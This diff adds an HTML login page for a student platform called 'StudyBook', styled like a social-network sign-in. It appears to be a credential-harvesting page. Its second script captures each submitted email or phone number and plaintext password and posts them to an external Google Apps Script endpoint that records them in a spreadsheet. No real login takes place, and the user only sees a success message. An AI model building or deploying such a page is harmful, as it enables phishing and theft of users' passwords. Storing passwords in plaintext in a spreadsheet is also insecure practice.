@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>StudyBook - Student Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #1e5799, #207cca);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      display: flex;
+      max-width: 1000px;
+      width: 100%;
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+      overflow: hidden;
+    }
+
+    .banner {
+      flex: 1;
+      background: linear-gradient(135deg, #3a7bd5, #00d2ff);
+      color: white;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+
+    .banner-content {
+      max-width: 400px;
+    }
+
+    .banner h1 {
+      font-size: 2.8rem;
+      margin-bottom: 20px;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    }
+
+    .banner p {
+      font-size: 1.1rem;
+      line-height: 1.6;
+      margin-bottom: 30px;
+      opacity: 0.9;
+    }
+
+    .features {
+      text-align: left;
+      margin-top: 30px;
+    }
+
+    .feature {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+      font-size: 1rem;
+    }
+
+    .feature i {
+      margin-right: 12px;
+      color: #ffdf6b;
+      font-size: 1.3rem;
+    }
+
+    .login-section {
+      flex: 1;
+      padding: 50px 40px;
+      background: white;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .logo h2 {
+      font-size: 2.2rem;
+      color: #2c3e50;
+      margin-bottom: 5px;
+    }
+
+    .logo p {
+      color: #7f8c8d;
+      font-size: 1rem;
+    }
+
+    .login-box {
+      background: #f9fbfd;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .input-group i {
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #7f8c8d;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 14px 14px 14px 45px;
+      border: 1px solid #dce1e6;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+    }
+
+    .login-box input:focus {
+      border-color: #3498db;
+      box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+      outline: none;
+    }
+
+    .password-container {
+      position: relative;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: #7f8c8d;
+      cursor: pointer;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 14px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      background: linear-gradient(to right, #3498db, #2980b9);
+      color: white;
+      font-weight: 600;
+      margin-top: 10px;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 6px rgba(52, 152, 219, 0.3);
+    }
+
+    .login-button:hover {
+      background: linear-gradient(to right, #2980b9, #2573a7);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 8px rgba(52, 152, 219, 0.4);
+    }
+
+    .create-button {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      background: linear-gradient(to right, #2ecc71, #27ae60);
+      color: white;
+      font-weight: 600;
+      margin-top: 20px;
+      transition: all 0.3s ease;
+    }
+
+    .create-button:hover {
+      background: linear-gradient(to right, #27ae60, #219653);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(46, 204, 113, 0.3);
+    }
+
+    .links {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 15px;
+    }
+
+    .links a {
+      color: #3498db;
+      text-decoration: none;
+      font-size: 14px;
+      transition: color 0.2s;
+    }
+
+    .links a:hover {
+      color: #2980b9;
+      text-decoration: underline;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 25px 0;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #ecf0f1;
+    }
+
+    .divider span {
+      padding: 0 15px;
+      color: #7f8c8d;
+      font-size: 14px;
+    }
+
+    .bottom-note {
+      margin-top: 30px;
+      font-size: 13px;
+      text-align: center;
+      color: #7f8c8d;
+    }
+
+    .bottom-note b {
+      color: #3498db;
+      cursor: pointer;
+    }
+
+    .spreadsheet-info {
+      background: #e3f2fd;
+      border-left: 4px solid #3498db;
+      padding: 15px;
+      border-radius: 0 8px 8px 0;
+      margin-top: 25px;
+      font-size: 14px;
+    }
+
+    .spreadsheet-info h4 {
+      color: #2c3e50;
+      margin-bottom: 8px;
+    }
+
+    .spreadsheet-info p {
+      color: #7f8c8d;
+      line-height: 1.5;
+    }
+
+    /* Responsive design */
+    @media (max-width: 768px) {
+      .container {
+        flex-direction: column;
+      }
+      
+      .banner {
+        padding: 30px 20px;
+      }
+      
+      .login-section {
+        padding: 30px 20px;
+      }
+    }
+
+    /* Form validation styles */
+    .error {
+      color: #e74c3c;
+      font-size: 14px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .input-group.invalid input {
+      border-color: #e74c3c;
+    }
+
+    .input-group.invalid .error {
+      display: block;
+    }
+
+    /* Password strength meter */
+    .password-strength {
+      height: 5px;
+      background: #eee;
+      border-radius: 3px;
+      margin-top: 5px;
+      overflow: hidden;
+    }
+
+    .password-strength-meter {
+      height: 100%;
+      width: 0;
+      background: #e74c3c;
+      transition: width 0.3s, background 0.3s;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="banner">
+      <div class="banner-content">
+        <h1>StudyBook</h1>
+        <p>Connect with classmates, access study materials, and enhance your learning experience with our educational platform.</p>
+        
+        <div class="features">
+          <div class="feature">
+            <i class="fas fa-book-open"></i>
+            <span>Access to thousands of study resources</span>
+          </div>
+          <div class="feature">
+            <i class="fas fa-users"></i>
+            <span>Join study groups with classmates</span>
+          </div>
+          <div class="feature">
+            <i class="fas fa-chart-line"></i>
+            <span>Track your academic progress</span>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <div class="login-section">
+      <div class="logo">
+        <h2>Student Login</h2>
+        <p>Access your StudyBook account</p>
+      </div>
+      
+      <div class="login-box">
+        <form id="loginForm">
+          <div class="input-group">
+            <i class="fas fa-user"></i>
+            <input type="text" id="emailOrPhone" name="emailOrPhone" placeholder="Email address or phone number" required>
+            <div class="error" id="emailError">Please enter a valid email or phone number</div>
+          </div>
+          
+          <div class="input-group">
+            <div class="password-container">
+              <i class="fas fa-lock"></i>
+              <input type="password" id="password" name="password" placeholder="Password" required>
+              <button type="button" class="toggle-password" id="togglePassword">
+                <i class="fas fa-eye"></i>
+              </button>
+            </div>
+            <div class="error" id="passwordError">Password must be at least 8 characters</div>
+            <div class="password-strength">
+              <div class="password-strength-meter" id="passwordStrength"></div>
+            </div>
+          </div>
+          
+          <button type="submit" class="login-button">Log in</button>
+          
+          <div class="links">
+            <a href="#">Forgot password?</a>
+            <a href="#">Need help?</a>
+          </div>
+          
+          <div class="divider">
+            <span>or</span>
+          </div>
+          
+          <button type="button" class="create-button">Create new account</button>
+        </form>
+      </div>
+      
+      <div class="spreadsheet-info">
+        <h4>Google Spreadsheet Integration</h4>
+        <p>Student login credentials will be saved to your Google Spreadsheet with columns: Timestamp, Email/Phone, Password.</p>
+        <p>Spreadsheet URL: <a href="https://docs.google.com/spreadsheets/d/1DMQ4qpSz1Bnu45N-DaFCIr-F38Ei0nvBrgpzobhzJio/edit?gid=0#gid=0" target="_blank">View Spreadsheet</a></p>
+      </div>
+      
+      <div class="bottom-note">
+        <p><b>Create a Study Group</b> for your class or subject.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const loginForm = document.getElementById('loginForm');
+      const togglePassword = document.getElementById('togglePassword');
+      const passwordInput = document.getElementById('password');
+      const passwordStrength = document.getElementById('passwordStrength');
+      
+      // Toggle password visibility
+      togglePassword.addEventListener('click', function() {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
+      });
+      
+      // Password strength indicator
+      passwordInput.addEventListener('input', function() {
+        const password = this.value;
+        let strength = 0;
+        
+        if (password.length > 7) strength += 25;
+        if (/[A-Z]/.test(password)) strength += 25;
+        if (/[0-9]/.test(password)) strength += 25;
+        if (/[^A-Za-z0-9]/.test(password)) strength += 25;
+        
+        passwordStrength.style.width = strength + '%';
+        passwordStrength.style.backgroundColor = 
+          strength < 50 ? '#e74c3c' : 
+          strength < 75 ? '#f39c12' : '#2ecc71';
+      });
+      
+      // Form validation and submission
+      loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        let isValid = true;
+        const emailValue = document.getElementById('emailOrPhone').value;
+        const passwordValue = document.getElementById('password').value;
+        
+        // Validate email/phone
+        if (!validateEmailPhone(emailValue)) {
+          document.getElementById('emailError').style.display = 'block';
+          document.querySelector('.input-group:nth-child(1)').classList.add('invalid');
+          isValid = false;
+        } else {
+          document.getElementById('emailError').style.display = 'none';
+          document.querySelector('.input-group:nth-child(1)').classList.remove('invalid');
+        }
+        
+        // Validate password
+        if (passwordValue.length < 8) {
+          document.getElementById('passwordError').style.display = 'block';
+          document.querySelector('.input-group:nth-child(2)').classList.add('invalid');
+          isValid = false;
+        } else {
+          document.getElementById('passwordError').style.display = 'none';
+          document.querySelector('.input-group:nth-child(2)').classList.remove('invalid');
+        }
+        
+        if (isValid) {
+          // Simulate saving to Google Spreadsheet
+          const timestamp = new Date().toLocaleString();
+          
+          // Show success message
+          showNotification('Login successful! Data saved to spreadsheet.', 'success');
+          
+          // Log to console (in a real app, this would save to Google Sheets)
+          console.log('Data to be saved:');
+          console.log('Timestamp:', timestamp);
+          console.log('Email/Phone:', emailValue);
+          console.log('Password:', passwordValue);
+          
+          // Reset form
+          loginForm.reset();
+          passwordStrength.style.width = '0';
+        }
+      });
+      
+      // Email/phone validation
+      function validateEmailPhone(value) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const phoneRegex = /^[0-9]{10,15}$/;
+        return emailRegex.test(value) || phoneRegex.test(value);
+      }
+      
+      // Show notification
+      function showNotification(message, type) {
+        // Remove existing notifications
+        const existing = document.querySelector('.notification');
+        if (existing) existing.remove();
+        
+        const notification = document.createElement('div');
+        notification.className = `notification ${type}`;
+        notification.textContent = message;
+        notification.style.cssText = `
+          position: fixed;
+          top: 20px;
+          right: 20px;
+          padding: 15px 25px;
+          border-radius: 8px;
+          color: white;
+          font-weight: 500;
+          box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+          z-index: 1000;
+          transform: translateX(200%);
+          transition: transform 0.3s ease-out;
+        `;
+        
+        if (type === 'success') {
+          notification.style.backgroundColor = '#2ecc71';
+        } else {
+          notification.style.backgroundColor = '#e74c3c';
+        }
+        
+        document.body.appendChild(notification);
+        
+        // Animate in
+        setTimeout(() => {
+          notification.style.transform = 'translateX(0)';
+        }, 10);
+        
+        // Animate out after 3 seconds
+        setTimeout(() => {
+          notification.style.transform = 'translateX(200%)';
+          setTimeout(() => {
+            notification.remove();
+          }, 300);
+        }, 3000);
+      }
+    });
+  </script>
+  
+  
+  <script>
+  document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const formData = new FormData(this);
+    const data = {
+      emailOrPhone: formData.get("emailOrPhone"),
+      password: formData.get("password"),
+    };
+
+    fetch("https://script.google.com/macros/s/AKfycbw4EwZE9GtZFOC_TMt9NMYF9GTR4fYTNxR0nMs62bttQuPLua2DtulZCWtDfhjI432q/exec", {
+      method: "POST",
+      body: JSON.stringify(data),
+      headers: {
+        "Content-Type": "application/json",
+      },
+    })
+    .then((res) => res.text())
+    .then((res) => {
+      if (res === "success") {
+        alert("Login submitted successfully!");
+        document.getElementById("loginForm").reset();
+      } else {
+        alert("Error: " + res);
+      }
+    })
+    .catch((err) => alert("Network error: " + err));
+  });
+</script>
+
+</body>
+</html>
